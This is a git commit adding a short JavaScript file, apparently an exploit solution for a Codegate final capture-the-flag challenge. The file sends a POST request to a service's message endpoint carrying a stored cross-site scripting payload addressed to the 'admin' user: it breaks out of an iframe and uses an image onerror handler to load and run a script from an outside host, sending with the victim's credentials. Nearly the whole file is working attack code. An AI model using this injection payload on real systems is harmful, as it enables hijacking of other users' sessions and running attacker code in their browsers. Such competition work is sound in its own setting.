5d66ad7e4154ffe022732875c5417ca9285f30a9
junorouse <junorouse@gmail.com>
2020-09-03 21:43:02 -0700

    add: two-service

---
+++ 2020/codegate-final/two-service/stage1.js
@@ -0,0 +1,13 @@
+fetch("http://110.10.147.157:4999/api/sendmsg.aspx", {
+  "headers": {
+    "accept": "*/*",
+    "accept-language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
+    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryhTKFtAWMPJyCMOgm"
+  },
+  "referrer": "http://110.10.147.157:4999/unreadchat.aspx?id=admin",
+  "referrerPolicy": "no-referrer-when-downgrade",
+  "body": "------WebKitFormBoundaryhTKFtAWMPJyCMOgm\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\nadmin\r\n------WebKitFormBoundaryhTKFtAWMPJyCMOgm\r\nContent-Disposition: form-data; name=\"msg\"\r\n\r\nhttp://www.naver.com\nlol\"></iframe><img src=1 onerror=\"window.xaa=document.createElement('script');window.xaa.src='//pass.imjuno.com/cg/1.js';document.head.appendChild(window.xaa);\"><iframe>\r\n------WebKitFormBoundaryhTKFtAWMPJyCMOgm--\r\n",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
